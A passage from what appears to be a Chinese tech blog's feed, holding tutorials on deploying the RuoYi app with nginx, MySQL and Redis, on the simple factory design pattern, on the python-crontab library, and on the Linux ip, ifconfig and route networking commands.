class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd ruoyi-ui</span><br><span class="line">npm install --unsafe-perm --registry=https://registry.npm.taobao.org</span><br><span class="line">npm run build:prod</span><br></pre></td></tr></table></figure><p><img src="https://static.luozhinet.com/d5/85fcb4408de7230ecfb3341158680d" alt="file"></p><p>（3）修改nginx的配置文件（也就是nginx.conf），使其前端项目能够被访问，一般nginx会被安装在&#x2F;usr&#x2F;local目录下，因此配置文件路径为&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;conf&#x2F;nginx.conf 。如果忘记nginx安装在哪里了，可以用如下命令找到它：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name &#x27;nginx.conf&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://static.luozhinet.com/75/b62d1e51352ead6686293d4c0e53e6" alt="file"></p><p>用vim编辑器打开nginx.conf，修改配置。修改的几个地方，最好图中的信息都一样，红色框框圈出来的是容易忽略的地方如下：</p><p><img src="https://static.luozhinet.com/17/fc82a57bbb01e4356a754246b99a72" alt="file"></p><p>1、 修改为root用户</p><p>2、修改监听listen的端口号为9000，这个端口号取决于自己想从几号端口访问前端页面，后续也别忘了在防火墙中开启这个端口，不然无法访问；server_name为你的服务器ip，如果你有域名且配置解析好了，也可以再在此添域名</p><p><img src="https://static.luozhinet.com/c6/0206ba74cc8d574f4cebe2c206b868" alt="file"></p><p>3、找到这些内容并将root 后跟的路径修改为刚才前端代码打包的dist文件夹的路径，保存后退出。如果仍不清楚改哪里，可以翻倒博客最后面的部分，有两张nginx.conf的整体示意图。</p><p><img src="https://static.luozhinet.com/14/f56e5445e6941a8a8438f0fa1ff5ce" alt="file"></p><p>4、由于上述前端使用的是9000端口（也可以换为你自己想要的端口，例如80端口），因此要在防火墙中也打开这个端口，外界才可以访问。于此同时，后端也需要一个8080端口，因此也要将其打开，后续部署后端服务要用到。注意有时候可能你想用的端口已经被其他进程占用，可以尝试找到该进程并将其kill掉或者重新开另一个端口号，具体方法不在此赘述，可上网查询。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">firewall-cmd --zone=public --add-port=9000/tcp --permanent</span><br><span class="line">firewall-cmd --zone=public --add-port=8080/tcp --permanent</span><br></pre></td></tr></table></figure><p>我用的是阿里云的轻量应用型服务器，因此还需要检查以下宝塔界面的“安全”里面是否开启该端口，以及阿里云服务器工作台里的“安全”-&gt;“防火墙”中的端口，如果没有开启，则需要在这里手动开启。此外阿里云的ECS云服务器需要为该端口号添加安全组规则。</p><p><img src="https://static.luozhinet.com/8c/28c948b58fbc2fe13d2fca10cea319" alt="file"></p><p><img src="https://static.luozhinet.com/3a/18eab40e9025437e7086ac80dc12a5" alt="file"></p><p>5、端口配置好了后，每次修改了nginx的配置文件后一定要重新启动nginx，使新配置生效。如果重启失败，则先找到nginx的进程，然后将其kill掉，再重启nginx：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">如果已经将nginx配置到全局的环境变量中，就可以直接运行这个命令重启nginx</span><br><span class="line">nginx -s reload</span><br><span class="line">如果没有将其配置到全局的环境变量中，则需要进入安装的nginx/sbin/目录中，用如下命令：</span><br><span class="line">./nginx -s reload</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">查看进程号: ps -ef|grep nginx</span><br><span class="line">杀死进程：kill -term xxxx/ kill -int xxxx</span><br></pre></td></tr></table></figure><p><img src="https://static.luozhinet.com/6c/12740796b54196f9d6c5d8d173b71b" alt="file"></p><p>6、浏览器输入“ip:9000“，例如：198.172.1.1:9000，如果出现出现如下画面，则表示前端启动成功。否则则需要仔细检查两个地方，一个是nginx的配置信息，一个是端口是否真的被完全打开：</p><p><img src="https://static.luozhinet.com/c9/782ba2b4a0fc9870874e1f9463e2d8" alt="file"></p><h3 id="5-后端准备"><a href="#5-后端准备" class="headerlink" title="5.后端准备"></a>5.后端准备</h3><p>（1）配置服务器上的mysql数据库，使mysql数据库可以被远程访问。具体教程可以看<a href="https://blog.csdn.net/VariatioZbw/article/details/105823337">https://blog.csdn.net/VariatioZbw/article/details/105823337</a><br>开启后可以在服务器上远程连接一下看是否成功：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mysql -h 198.172.1.1 -P 3306 -u root -p123</span><br><span class="line">h表示host，服务器ip地址</span><br><span class="line">P表示端口号，一般mysql端口号为3306</span><br><span class="line">u表示用户名，建议设为root用户</span><br><span class="line">p表示密码，123为root这个用户的密码，p后面要紧跟密码，不要空格</span><br></pre></td></tr></table></figure><p>（2）redis数据库也要配置好，例如它的端口要被打开，设置密码，具体方法可以参考网上的方法。</p><p>（3）进入mysql数据库，建一个名为ry-vue的数据库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">数据库名称中有‘-’符号，需要用反引号`,是键盘上tab键上面一个键的符号</span><br><span class="line">create database `ry-vue`;</span><br></pre></td></tr></table></figure><p><img src="https://static.luozhinet.com/11/1710ed724d1ecb22f8be48cae90aea" alt="file"></p><p><img src="https://static.luozhinet.com/7c/e87d254cd1a4a9045e8225a7ac9e7f" alt="file"></p><p>将之前下载好的项目文件夹中的sql文件夹里的两个数据表上传到服务器中，我们可以继续将这两个文件放在之前在服务器根目录下创建好的project目录里面</p><p><img src="https://static.luozhinet.com/d4/72c2d64a5f2507c9762e677cbc8b31" alt="file"></p><p><img src="https://static.luozhinet.com/30/7f1a6fda9ff87eead20d50941d72e6" alt="file"></p><p>然后登录进入mysql数据库，使用刚才创建ry-vue数据库，导入两个数据表进入ry-vue数据库中：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use ry-vue;</span><br><span class="line">source /project/quartz.sql;</span><br><span class="line">source /project/ry_20210908.sql;</span><br></pre></td></tr></table></figure><p>(4) 修改项目中ruoyi-admin中的三个文件，如下：</p><p><img src="https://static.luozhinet.com/96/9b3b4694103eeb9e21ecaeb6518984" alt="file"></p><p>在application.yml中，修改redis的信息，分别为host地址（你的服务器ip），port端口号（你的redis开放的端口号，一般为6379），password密码（你的redis的密码）。</p><p><img src="https://static.luozhinet.com/e0/86a31a0c314646754fedff622971b3" alt="file"></p><p>在application-druid.yml中，修改mysql的信息，url的中间填写访问mysql的 ip:端口号，例如：198.172.1.1:3306；username填你的mysql用户名；password填你的mysql密码。</p><p><img src="https://static.luozhinet.com/54/cd62803c6c4649f5ab97cea2302bb2" alt="file"></p><p>在logback.xml中，找到日志存放路径，value修改为你存放日志的目录，可以在之前创建的project文件夹中建一个logs文件夹，则填为value&#x3D;”&#x2F;project&#x2F;logs“</p><p><img src="https://static.luozhinet.com/ec/230c7f43f26bfb040e6a27fee0a0ca" alt="file"></p><p>自此，该修改的已经修改完了。</p><p>（5）尝试运行后端项目</p><p>可以通过InteliJ IDEA或者eclipse软件来运行这个java后端项目，前提是你运行的本机上应该也具备一定的环境，jdk&gt;&#x3D;1.8，以及本地8080端口（用于后端）已开启且未被占用。其他的例如mysql，redis可以直接通过服务器ip+端口号远程访问，不需要在本机上配置。</p><p>出现如下表示启动成功，可以开始打包后端代码。如果未成功也不用灰心，检查报错，是否关于mysql，redis的（如果是，则可能是这两个没有在你的服务器上配置好或者刚才修改的信息出错了，例如账号，密码不对，或者远程连接未成功，导致本机无法远程访问等等），如果是关于8080端口，可能是由于你本机有程序以及占用了8080端口，这个基本上就不是什么问题，部署到服务器后只要服务器8080端口可用就行。接下来可以直接打包代码。</p><p><img src="https://static.luozhinet.com/79/6fb71ba4db3f5e2e5cc0aee49fee9b" alt="file"></p><p>（6）打包后端代码jar包</p><p>熟练使用java的人可以直接通过InteliJ IDEA或者eclipse软件打jar包。不熟悉的有第二种方法，是若依提供的。进入下载的项目文件夹中的bin目录下，直接双击执行package.bat，它会直接在项目中生成target文件夹，里面包含以及打包好的jar包。我们要使用的是ruoyi-admin文件夹下的target里的jar包。运行package.bat需要marven环境&gt;&#x3D;3.0，自行参考网上方法按照。如下图操作顺序：</p><p><img src="https://static.luozhinet.com/2e/ccd63d3c237aabe0816623e224b393" alt="file"></p><p><img src="https://static.luozhinet.com/fb/ed850b5b8b6a236c3193fec866321a" alt="file"></p><p><img src="https://static.luozhinet.com/52/085fbebdd1b3e3de7ee454da353e57" alt="file"></p><p><img src="https://static.luozhinet.com/2c/4e7aca4df15e4cf4676ecb53ac22cb" alt="file"></p><p><img src="https://static.luozhinet.com/d6/a59328b9061dfe55c67dc86b4b5de1" alt="file"></p><p>将这个ruoyi-admin.jar包上传至服务器，可继续存于刚才建的project目录中。</p><h3 id="6-后端部署"><a href="#6-后端部署" class="headerlink" title="6.后端部署"></a>6.后端部署</h3><p>（1）再此修改nginx配置文件（nginx.conf），添加后端信息。proxy_pass中空余的部分填服务器ip地址，别忘了上面是location &#x2F;prod-api&#x2F;。修改后别忘了重启nginx服务，用上面刚才提到的命令。</p><p><img src="https://static.luozhinet.com/0d/b6df5af0776def1b85ba721b998c75" alt="file"></p><p>修改未prod-api是由于前端发送请求的时候就是通过这个接口来发送的</p><p><img src="https://static.luozhinet.com/bf/aa2bee4f0f0e9acc1975eb250a5b7d" alt="file"></p><p>nginx配置文件nginx.conf的整体示意图（包括前端和后端配置修改的所有地方）：</p><p><img src="https://static.luozhinet.com/d9/1c736342ab7e3087e5b502207650fe" alt="file"></p><p><img src="https://static.luozhinet.com/8f/265bca0229a2a76dc46e0850febe50" alt="file"></p><p>（2）远程连接服务器，进入project目录，后台启动jar包：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nohup java -jar ruoyi-admin.jar &amp;</span><br></pre></td></tr></table></figure><h3 id="7-成功部署效果"><a href="#7-成功部署效果" class="headerlink" title="7.成功部署效果"></a>7.成功部署效果</h3><p>用浏览器访问”ip:前端端口号“：</p><p>输入验证码登录后成功进入后台：</p><p><img src="https://static.luozhinet.com/d0/8e51a018a721ceb0bbebddbd7f70a1" alt="file"></p><p>本文转自：<a href="https://blog.csdn.net/weixin_44248258/article/details/124213606">https://blog.csdn.net/weixin_44248258&#x2F;article&#x2F;details&#x2F;124213606</a></p>]]></content>
      
      
      <categories>
          
          <category> 技术教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 操作 </tag>
            
            <tag> 密码 </tag>
            
            <tag> 服务 </tag>
            
            <tag> 服务器 </tag>
            
            <tag> 账号 </tag>
            
            <tag> 方法 </tag>
            
            <tag> 文件 </tag>
            
            <tag> run </tag>
            
            <tag> 目录 </tag>
            
            <tag> 域名 </tag>
            
            <tag> 部署 </tag>
            
            <tag> 指令 </tag>
            
            <tag> 镜像 </tag>
            
            <tag> nginx </tag>
            
            <tag> 修改 </tag>
            
            <tag> 地址 </tag>
            
            <tag> int </tag>
            
            <tag> java </tag>
            
            <tag> public </tag>
            
            <tag> username </tag>
            
            <tag> 时间 </tag>
            
            <tag> 命令 </tag>
            
            <tag> user </tag>
            
            <tag> 视频 </tag>
            
            <tag> mysql </tag>
            
            <tag> 日志 </tag>
            
            <tag> sql </tag>
            
            <tag> 端口 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>创建型模式之门—简单工厂</title>
      <link href="/posts/b43e4543fee2/"/>
      <url>/posts/b43e4543fee2/</url>
      
        <content type="html"><![CDATA[<h4 id="1-“new”有什么不对劲？"><a href="#1-“new”有什么不对劲？" class="headerlink" title="1.“new”有什么不对劲？"></a>1.“new”有什么不对劲？</h4><p>在我们没有接触到工厂模式（简单工厂、工厂方法模式、抽象工厂模式）之前，我们实例化对象唯一的方法就是通过“new”关键字来完成。但是，大量的使用“new”关键字来实例化对象会违背一些设计原则，因为代码与具体的类型绑在一起，从而导致<strong>过多的依赖于细节而非抽象</strong>，这样代码就很难适应需求变化。</p><p>在面向对象编程中我们大量的使用到了继承、多态的特性，但是在使用这些特性时往往会延申出一些新的问题。例如在一个有继承模块的代码当中，如果子类发生新增或删除，这就不得不去使用类的“调用层”做出相应的修改，因为你new的都是具体的类型，当下层发生变动就不得不去上层进行修改。对于这样的场景来说，实际上它也<strong>违背了设计模式原则之一的“开闭原则”</strong>，即对扩展开放，对修改关闭，这会不利于程序的稳定和扩展。</p><h4 id="2-举例反映问题"><a href="#2-举例反映问题" class="headerlink" title="2.举例反映问题"></a>2.举例反映问题</h4><p>接下来将通过代码案例来反映出，在一个使用继承模块的代码当中，大量使用“new”关键字，在设计层面会带来什么样的缺陷。我们以一个汽车销售系统作为背景，其中汽车类型UML图如下：</p><p><img src="https://static.luozhinet.com/d9/c6e46f55ce9d01d944c541326a9ead"></p><p>其中有一个卖车的方法使用到了“new”来实例化车型对象，相应的代码如下：</p><p> 1     &#x2F;&#x2F;卖车方法<br> 2     public void SellCar(string carType) 3     {<br> 4         Car car;<br> 5         if(carType&#x3D;&#x3D;”宝马 X3”)<br> 6         {<br> 7             car&#x3D;new Bmwx3(); 8         }<br> 9         else if(carType&#x3D;&#x3D;”吉普牧马人”)<br>10 {<br>11             car&#x3D;new Jeeper();<br>12 }<br>13         else if(carType&#x3D;&#x3D;”奔驰G63”)<br>14 {<br>15             car&#x3D;new BenzG63();<br>16 }<br>17<br>18         TestDrive(car);&#x2F;&#x2F;试驾<br>19         Collection(car);&#x2F;&#x2F;收款<br>20         License(car);&#x2F;&#x2F;上牌<br>21     }</p><p>在实际的生活当中我们应该都知道，4s店卖的车型不可能是一层不变的，而是经常性的会发生产品的更新换代，所以会不断对车型做出新增或删减。如果汽车销售系统中使用了以上的代码，这就意味这每次车型模块的调整都要同步到“卖车方法”中，并且随着公司规模的增大所卖的车型会增多，在新增车型后代码中出现大量的else if，这会显得非常臃肿，在删除时还可能误删。</p><p>即便你说你的“汽车销售系统只卖一种车”(也就是只new一种对象类型)，你可能还是会在使用构造函数创建对象时要加入参数的情形，这些变化都会促使你因为下层模块的调整而影响到上层模块。</p><p><img src="https://static.luozhinet.com/97/95e97ddfc58864375599bcc57e3131"></p><h4 id="3-改善方法"><a href="#3-改善方法" class="headerlink" title="3.改善方法"></a>3.改善方法</h4><p>1.编程当中任何需求或代码都是无法避免的，而我们能做到就是运用设计模式的思想，能够将程序更好的去适应变化。其中的一个思想就是：“找出变化的部分，把它们从不变的部分分离出来”。以上面的“汽车销售系统”中的卖车方法为例，分析变化如下：</p><p><img src="https://static.luozhinet.com/a6/9d4eacf23ac714a0a6cb2ca3853760"></p><p>2.然后，我们将变化的部分单独的封装到一个类的静态方法中，该类的静态方法将专门用于创建具体的汽车对象，代码如下：</p><p> 1 public class CarFactory 2 {<br> 3     public static Car CreateCarInstance(string type) 4     {<br> 5         Car car&#x3D;null;<br> 6         if(carType&#x3D;&#x3D;”宝马 X3”)<br> 7         {<br> 8             car&#x3D;new Bmwx3(); 9 }<br>10         else if(carType&#x3D;&#x3D;”吉普牧马人”)<br>11 {<br>12             car&#x3D;new Jeeper();<br>13 }<br>14         else if(carType&#x3D;&#x3D;”奔驰G63”)<br>15 {<br>16             car&#x3D;new BenzG63();<br>17 }<br>18         return car;<br>19 }<br>20 }</p><p>3.在抽离并封装变化后，我们将对“卖车方法”中的实例化车对象部分进行改造。</p><p>1   public void SellCar(string carType)<br>2 {<br>3         Car car&#x3D;CarFactory.CreateCarInstance(carType);<br>4<br>5         TestDrive(car);&#x2F;&#x2F;试驾<br>6         Collection(car);&#x2F;&#x2F;收款<br>7         License(car);&#x2F;&#x2F;上牌<br>8     }</p><p>根据以上的三个步骤，其实一个简单工厂创建对象的方式就已经形成了，<strong>其中专门创建对象的Factory类我们称之为工厂，它实例化的对象我们称之为产品。</strong>此时我们创建对象的方式不在是”new”，而是通过一个静态方法。</p><p>对于上层模块(卖车方法)，在也不用担心下层模块(汽车车型)的变化而牵连到自身，它只有根据指定的类型创建对应的车型对象即可，并且上层模块(卖车方法)也不用在承担对象创建的细节，减少大量代码和复杂度。</p><p>另外简单工厂也解决了对象创建复用的问题，例如4s店的汽车保险系统、汽车维修系统等等都会用到实例化车型对象。这样的话，如果车型发生修改我们只用调整简单工厂类即可而其他(调用层)都不必受到改动的牵连。</p><h4 id="4-定义"><a href="#4-定义" class="headerlink" title="4.定义"></a>4.定义</h4><p>简单工厂又称之为静态工厂方法，它属于创建型模式中的一种简单运用。</p><p>严格来讲它其实并不属于一种设计模式，反而比较像我们在遵循设计模式原则时的一种<strong>编程习惯</strong>。你要你能够在编程中遵循并灵活运用：迪米特法则（最少知道原则）、依赖倒置（依赖抽象，不依赖细节）、里氏替换（子类替代父类）这些原则，其实就会无形当中使用简单工厂来实现对象的实例化，而并非只使用“new”。</p><h4 id="5-短板"><a href="#5-短板" class="headerlink" title="5.短板"></a>5.短板</h4><p>使用简单工厂实例化对象虽然解决了一些问题，但是有同时存在一些新的问题。因为我们的工厂本身就是一个具体的类型，这违反了面向接口(抽象)编程的思想。</p><p>还是以汽车销售作为背景来说，假如你依赖的这个A工厂因为疫情出现停产，又或者因为你要扩张你的车型使用新的工厂，那么此时你依赖的A工厂(具体的类)就很难做出<strong>扩展</strong>，而只能因为你换了工厂导致上层模块都要跟着调整。所以，后续诞生出的“工厂方法模式”和“抽象工厂模式”，就是在不断解决因为变化而带来各种的问题。</p>]]></content>
      
      
      <categories>
          
          <category> 技术教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 函数 </tag>
            
            <tag> 方法 </tag>
            
            <tag> 创建 </tag>
            
            <tag> 对象 </tag>
            
            <tag> 修改 </tag>
            
            <tag> new </tag>
            
            <tag> public </tag>
            
            <tag> string </tag>
            
            <tag> 公司 </tag>
            
            <tag> return </tag>
            
            <tag> void </tag>
            
            <tag> car </tag>
            
            <tag> 工厂 </tag>
            
            <tag> cartype </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python编程之定时任务(crontab)详解</title>
      <link href="/posts/f691d1b683d4/"/>
      <url>/posts/f691d1b683d4/</url>
      
        <content type="html"><![CDATA[<h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p> python-crontab是python模块，提供了对cron任务的访问，并使得我们可以通过python对crontab文件进行修改。</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p><code>pip install python-crontab</code></p><p><strong>注意：如果在使用CronTab的时候报错，报错信息为 got an unexpected keyword argument ‘user’ 可能是库安装错了，应该安装python-crontab而不是crontab。</strong></p><h2 id="使用案例"><a href="#使用案例" class="headerlink" title="使用案例"></a>使用案例</h2><ul><li>增加crontab任务，一般有两种方式</li></ul><p>from crontab import CronTab</p><h1 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h1><h1 id="创建cron访问"><a href="#创建cron访问" class="headerlink" title="创建cron访问"></a>创建cron访问</h1><p>cron &#x3D; CronTab(user&#x3D;’root’)</p><h1 id="增加新作业"><a href="#增加新作业" class="headerlink" title="增加新作业"></a>增加新作业</h1><p>job &#x3D; cron.new(command&#x3D;’echo hello_world’)</p><h1 id="每一分钟执行一次"><a href="#每一分钟执行一次" class="headerlink" title="每一分钟执行一次"></a>每一分钟执行一次</h1><p>job.minute.every(1)</p><h1 id="写入作业"><a href="#写入作业" class="headerlink" title="写入作业"></a>写入作业</h1><p>cron.write()</p><h1 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h1><p>with CronTab(user&#x3D;’root’) as cron:</p><pre><code>job \= cron.new(command=&#39;echo hello\_world&#39;)job.minute.every(1)</code></pre><p>print(‘cron.write() was just executed’)</p><ul><li>访问crontab可以通过五种方式实现</li></ul><p>from crontab import CronTab</p><h1 id="下述三种方法只能在Unix上使用"><a href="#下述三种方法只能在Unix上使用" class="headerlink" title="下述三种方法只能在Unix上使用"></a>下述三种方法只能在Unix上使用</h1><h1 id="不会从任何用户加载任何内容"><a href="#不会从任何用户加载任何内容" class="headerlink" title="不会从任何用户加载任何内容"></a>不会从任何用户加载任何内容</h1><p>empty_cron &#x3D; CronTab()</p><h1 id="从当前用户加载"><a href="#从当前用户加载" class="headerlink" title="从当前用户加载"></a>从当前用户加载</h1><p>my_user_cron &#x3D; CronTab(user&#x3D;True)</p><h1 id="从-username加载"><a href="#从-username加载" class="headerlink" title="从$username加载"></a>从$username加载</h1><p>users_cron &#x3D; CronTab(user&#x3D;’username’)</p><h1 id="可适用于window"><a href="#可适用于window" class="headerlink" title="可适用于window"></a>可适用于window</h1><h1 id="从文件中加载"><a href="#从文件中加载" class="headerlink" title="从文件中加载"></a>从文件中加载</h1><p>file_cron &#x3D; CronTab(tabfile&#x3D;’filename.tab’)</p><h1 id="使用字符串变量作为crontab"><a href="#使用字符串变量作为crontab" class="headerlink" title="使用字符串变量作为crontab"></a>使用字符串变量作为crontab</h1><p>mem_cron &#x3D; CronTab(tab&#x3D;”””* * * * * command”””)</p><ul><li>设置作业时间</li></ul><p>from crontab import CronTab</p><p>cron = CronTab(user&#x3D;True)</p><p>job = cron.new(command&#x3D;’echo hello world’)</p><h1 id="每两分钟运行一次"><a href="#每两分钟运行一次" class="headerlink" title="每两分钟运行一次"></a>每两分钟运行一次</h1><p>job.minute.every(2) # Set to *&#x2F;2 * * * *</p><h1 id="每两小时运行一次"><a href="#每两小时运行一次" class="headerlink" title="每两小时运行一次"></a>每两小时运行一次</h1><p>job.hour.every(2)    # Set to * *&#x2F;2 * * *</p><h1 id="每两天运行一次"><a href="#每两天运行一次" class="headerlink" title="每两天运行一次"></a>每两天运行一次</h1><p>job.day.every(2)     # Set to * * *&#x2F;2 * *</p><h1 id="每天的早上2点执行"><a href="#每天的早上2点执行" class="headerlink" title="每天的早上2点执行"></a>每天的早上2点执行</h1><p>job.hour.on(2)        # Set to * 2 * * *</p><h1 id="每周日执行"><a href="#每周日执行" class="headerlink" title="每周日执行"></a>每周日执行</h1><p>job.dow.on(‘SUN’) </p><h1 id="每周日、周五执行"><a href="#每周日、周五执行" class="headerlink" title="每周日、周五执行"></a>每周日、周五执行</h1><p>job.dow.on(‘SUN’, ‘FRI’)</p><h1 id="四月到11月期间执行"><a href="#四月到11月期间执行" class="headerlink" title="四月到11月期间执行"></a>四月到11月期间执行</h1><p>job.month.during(‘APR’, ‘NOV’)</p><h1 id="每两个月的2号到4号的早上10：02执行"><a href="#每两个月的2号到4号的早上10：02执行" class="headerlink" title="每两个月的2号到4号的早上10：02执行"></a>每两个月的2号到4号的早上10：02执行</h1><p>job.setall(2, 10, ‘2-4’, ‘*&#x2F;2’, None)  # Set to 2 10 2-4 *&#x2F;2 *</p><ul><li> 删除crontab任务</li></ul><h1 id="删除一个任务"><a href="#删除一个任务" class="headerlink" title="删除一个任务"></a>删除一个任务</h1><p>cron.remove(job)</p><h1 id="删除多个任务"><a href="#删除多个任务" class="headerlink" title="删除多个任务"></a>删除多个任务</h1><p>cron.remove_all(comment=‘LoveFishO’)</p><p>cron.remove_all(‘echo’)</p><p>cron.remove_all()</p><ul><li>获取修改任务的命令或注释</li></ul><h1 id="获取任务的命令或注释"><a href="#获取任务的命令或注释" class="headerlink" title="获取任务的命令或注释"></a>获取任务的命令或注释</h1><p>command = job.command<br>comment = job.comment</p><h1 id="修改任务的命令或注释"><a href="#修改任务的命令或注释" class="headerlink" title="修改任务的命令或注释"></a>修改任务的命令或注释</h1><p>job.set_command(“echo LoveFishO”)<br>job.set_comment(“LoveFishO”)</p><ul><li>写入任务</li></ul><h1 id="把任务写入系统"><a href="#把任务写入系统" class="headerlink" title="把任务写入系统"></a>把任务写入系统</h1><p>cron.write()</p><h1 id="把任务写入文件"><a href="#把任务写入文件" class="headerlink" title="把任务写入文件"></a>把任务写入文件</h1><p>cron.write( ‘filename.tab’ )</p><h1 id="把任务写入当前用户的定时任务中"><a href="#把任务写入当前用户的定时任务中" class="headerlink" title="把任务写入当前用户的定时任务中"></a>把任务写入当前用户的定时任务中</h1><p>cron.write_to_user(user&#x3D;True)</p><h1 id="把任务写入特定用户的定时任务中"><a href="#把任务写入特定用户的定时任务中" class="headerlink" title="把任务写入特定用户的定时任务中"></a>把任务写入特定用户的定时任务中</h1><p>cron.write_to_user(user&#x3D;’LoveFishO’)</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://pypi.org/project/python-crontab/">python-crontab官方文档</a></p>]]></content>
      
      
      <categories>
          
          <category> 技术教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 方法 </tag>
            
            <tag> 文件 </tag>
            
            <tag> 修改 </tag>
            
            <tag> import </tag>
            
            <tag> username </tag>
            
            <tag> 时间 </tag>
            
            <tag> 命令 </tag>
            
            <tag> crontab </tag>
            
            <tag> cron </tag>
            
            <tag> job </tag>
            
            <tag> user </tag>
            
            <tag> command </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ip、ifconfig 和 route命令</title>
      <link href="/posts/4d252cdf0e76/"/>
      <url>/posts/4d252cdf0e76/</url>
      
        <content type="html"><![CDATA[<h1 id="ip、ifconfig-和-route命令"><a href="#ip、ifconfig-和-route命令" class="headerlink" title="ip、ifconfig 和 route命令"></a>ip、ifconfig 和 route命令</h1><blockquote><p>linux的ip命令和ifconfig类似，但前者功能更强大，并旨在取代后者。使用ip命令，只需一个命令，你就能很轻松地执行一些网络管理任务。ifconfig是net-tools中已被废弃使用的一个命令，许多年前就已经没有维护了。iproute2套件里提供了许多增强功能的命令，ip命令即是其中之一。</p></blockquote><h2 id="常用网络配置"><a href="#常用网络配置" class="headerlink" title="常用网络配置"></a>常用网络配置</h2><table><thead><tr><th>功能</th><th>ifconfig 命令</th><th>ip 命令</th><th>route 命令</th></tr></thead><tbody><tr><td>查看网络</td><td><code>ifconfig [-a] [&lt;interface&gt;]</code></td><td><code>ip addr [show &lt;interface&gt;]</code></td><td>-—</td></tr><tr><td>添加网络</td><td>&#96;ifconfig <interface> add <address>[&#x2F;<prefixlen>] [up</td><td>down]&#96;</td><td></td></tr><tr><td>&#96;ifconfig <interface> <address> netmask <mask> [up</td><td>down]&#96;</td><td><code>ip addr add &lt;address&gt;[/&lt;prefixlen&gt;] dev &lt;interface&gt;</code></td><td>-—</td></tr><tr><td>删除网络</td><td><code>ifconfig &lt;interface&gt; del &lt;address&gt;[/&lt;prefixlen&gt;]</code></td><td><code>ip addr del &lt;address&gt;[/&lt;prefixlen&gt;] dev &lt;interface&gt;</code></td><td>-—</td></tr><tr><td>启动</td><td>关闭</td><td>&#96;ifconfig <interface> up</td><td>down&#96;</td></tr><tr><td>查看路由</td><td>-—</td><td><code>ip route [show &lt;interface&gt;/&lt;prefixlen&gt;]</code></td><td><code>route [-n]</code></td></tr><tr><td>添加路由</td><td>-—</td><td><code>ip route add &lt;address&gt;[/&lt;prefixlen&gt;] via &lt;gateway&gt; dev &lt;interface&gt;</code></td><td>&#96;route add [-net</td></tr><tr><td>删除路由</td><td>-—</td><td><code>ip route del &lt;address&gt;[/&lt;prefixlen&gt;]</code></td><td>&#96;route del [-net</td></tr><tr><td>配置默认路由</td><td>-—</td><td><code>ip route add default via &lt;gateway&gt;</code></td><td>&#96;route [add</td></tr><tr><td>配置MAC地址</td><td><code>ifconfig &lt;interface&gt; hw ether &lt;mac-address&gt;</code></td><td><code>ip link set dev &lt;interface&gt; address &lt;mac-address&gt;</code></td><td>-—</td></tr></tbody></table><p>Tips:</p><ul><li>使用ip route命令来设定路由时，其网段必须严格匹配。如：ip route add 3.3.3.3&#x2F;24 via 1.1.1.1这样配置就是不正确的，必须将3.3.3.3&#x2F;24改为3.3.3.0&#x2F;24才是正确的。</li><li>使用ip route设定路由时，其下一跳使用via关键字来指定。使用route命令设定ip时，其下一跳使用gw关键字来指定。</li><li>使用ip route设定网段或主机路由时，直接在该网段后面加上掩码即可。如：10.1.1.0&#x2F;24；而使用route命令设定主机路由时，需要使用-host关键字来指定，且后面不需要加掩码，指定网段路由时，需要使用-net关键字来指定，并且还需要netmask关键字来指定该路由的掩码。</li><li>route –n:显示路由表，且以ip或port的形式显示而不是使用主机名来显示;其中U表示路由是启动的,G表示是默认路由;</li></ul><h2 id="栗子"><a href="#栗子" class="headerlink" title="栗子"></a>栗子</h2><h3 id="ipv4-网络配置"><a href="#ipv4-网络配置" class="headerlink" title="ipv4 网络配置"></a>ipv4 网络配置</h3><ol><li><p>IP 命令</p><ul><li>ip addr show wlan0</li><li>ip addr add 192.168.0.193&#x2F;24 dev wlan0</li><li>ip addr del 192.168.0.193&#x2F;24 dev wlan0</li><li>ip route show</li><li>ip route add 4.4.4.0&#x2F;24</li><li>ip route add default via 192.168.0.196</li></ul></li><li><p>ifconfig 命令</p><ul><li>ifconfig eth0 192.168.0.120&#x2F;24 up</li><li>ifconfig 192.168.0.110 netmask 255.255.255.0 up</li></ul></li><li><p>route 命令</p><ul><li>route del -net 6.6.6.0 netmask 255.255.255.0</li><li>route add -host 6.6.6.6 gw 3.3.3.3 dev eth1</li></ul></li></ol><h3 id="ipv6-网络配置"><a href="#ipv6-网络配置" class="headerlink" title="ipv6 网络配置"></a>ipv6 网络配置</h3><ol><li><p>添加IPV6地址</p><ul><li>ip -6 addr add <ipv6address>&#x2F;<prefixlength> dev <interface><ul><li>ip -6 addr add 